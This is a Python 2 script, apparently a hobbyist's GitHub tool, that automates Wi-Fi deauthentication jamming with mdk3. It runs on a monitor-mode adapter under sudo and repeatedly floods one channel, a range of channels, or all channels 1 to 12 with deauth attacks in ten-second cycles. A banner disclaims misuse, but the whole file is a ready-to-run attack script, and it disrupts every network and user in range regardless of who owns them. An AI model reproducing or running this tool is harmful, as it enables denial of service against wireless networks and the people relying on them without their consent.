#with python2

import time
import subprocess
import os

# Global variable to store script start time
script_start_time = None

# Function to clear screen
def clear_screen():
    time.sleep(1)
    os.system("clear")

# Function to print banner
def print_banner():
    print "-" * 70
    print "          [ - MDK3 Channel Jammer - ]"
    print "! Code was created by Fattcat for Tp_Link Archer C7 v5 personal usage !"
    print "Checkout my GitHub Repo --> github.com/Fattcat"
    print "Checkout my YouTube --> https://www.youtube.com/channel/UCKfToKJFq-uvI8svPX0WzYQ"
    print "! DONT USE THIS CODE FOR BAD HACKING or WITHOUT PERMISSIONS !"
    print "-" * 70 + "\n"

# Function to check if script was started with sudo
def check_sudo():
    if os.geteuid() != 0:
        print "Script was NOT started with sudo. Please start the script with sudo."
        exit()
    else:
        print "Script was started with sudo :D\nContinuing"

# Function to get valid channel input
def get_valid_channel(prompt):
    while True:
        try:
            channel = int(raw_input(prompt))
            if 1 <= channel <= 12:
                return channel
            else:
                print "Invalid channel! Please enter a channel number between 1 and 12."
        except ValueError:
            print "Invalid input! Please enter a valid integer."

# Function to get current channel
def get_current_channel(adapter):
    result = subprocess.check_output(["iw", "dev", adapter, "info"])
    for line in result.splitlines():
        if "channel" in line:
            searched_channel = int(line.split()[1])
            print "Current CH is : %d\n" % searched_channel
            return int(line.split()[1])
    return None

# Function to set channel
def set_channel(adapter, channel):
    current_channel = get_current_channel(adapter)
    if current_channel != channel:
        subprocess.call(["iw", "dev", adapter, "set", "channel", str(channel)])
        time.sleep(2)
    print "Set channel %d" % channel

# Function to jam specific channel
def jam_specific_channel(adapter):
    global script_start_time
    channel = get_valid_channel("Type channel number (1-12) --> ")
    script_start_time = time.time()
    try:
        while True:
            set_channel(adapter, channel)
            print "MDK3 process started on channel %d\n" % channel
            process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
            time.sleep(10)
            process.terminate()
            print "Terminating MDK3 process on channel %d\n" % channel
    except KeyboardInterrupt:
        elapsed_time = time.time() - script_start_time
        minutes = int(elapsed_time // 60)
        seconds = int(elapsed_time % 60)
        print "\nScript was running %d minutes and %d seconds." % (minutes, seconds)

# Function to jam channel range
def jam_channel_range(adapter, first_channel, second_channel):
    global script_start_time
    script_start_time = time.time()
    try:
        while True:
            for channel in range(first_channel, second_channel + 1):
                set_channel(adapter, channel)
                print "MDK3 process started on channel %d\n" % channel
                process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
                time.sleep(10)
                process.terminate()
                print "Terminating MDK3 process on channel %d\n" % channel
    except KeyboardInterrupt:
        elapsed_time = time.time() - script_start_time
        minutes = int(elapsed_time // 60)
        seconds = int(elapsed_time % 60)
        print "\nScript was running %d minutes and %d seconds." % (minutes, seconds)

# Function to jam all channels
def jam_all_channels(adapter):
    global script_start_time
    script_start_time = time.time()
    try:
        while True:
            for channel in range(1, 13):
                set_channel(adapter, channel)
                print "MDK3 process started on channel %d\n" % channel
                process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
                time.sleep(10)
                process.terminate()
                print "Terminating MDK3 process on channel %d\n" % channel
    except KeyboardInterrupt:
        elapsed_time = time.time() - script_start_time
        minutes = int(elapsed_time // 60)
        seconds = int(elapsed_time % 60)
        print "\nScript was running %d minutes and %d seconds." % (minutes, seconds)

# Main function to run the script
def main():
    clear_screen()
    print_banner()
    check_sudo()

    adapter = "wlan1mon"

    print "\nLoading MDK3 CHANNEL JAMMER...\n"
    time.sleep(1)

    print "Please select an option\n"
    print "[1] - Jam ONLY 1 specific channel"
    print "[2] - Jam ALL channels (Pick CH to Pick CH)"
    print "      Example : First CH 6, Second CH 9"
    print "[3] - Jam ALL channels (1 to 12)\n"

    # User input for selection
    pick_to_jam = raw_input("I will Pick --> ")

    if pick_to_jam == "1":
        jam_specific_channel(adapter)
    elif pick_to_jam == "2":
        first_channel = get_valid_channel("Type FIRST channel number (1-12) --> ")
        second_channel = get_valid_channel("Type SECOND channel number (1-12) --> ")
        if first_channel >= second_channel:
            print "! WARNING !\nFirst Channel MUST BE LESS than Second Channel!"
            print "For example:\nFirst Channel: 3\nSecond Channel: 9"
        else:
            jam_channel_range(adapter, first_channel, second_channel)
    elif pick_to_jam == "3":
        jam_all_channels(adapter)
    else:
        print "Selected WRONG Option: %s" % pick_to_jam
        exit()

if __name__ == "__main__":
    main()
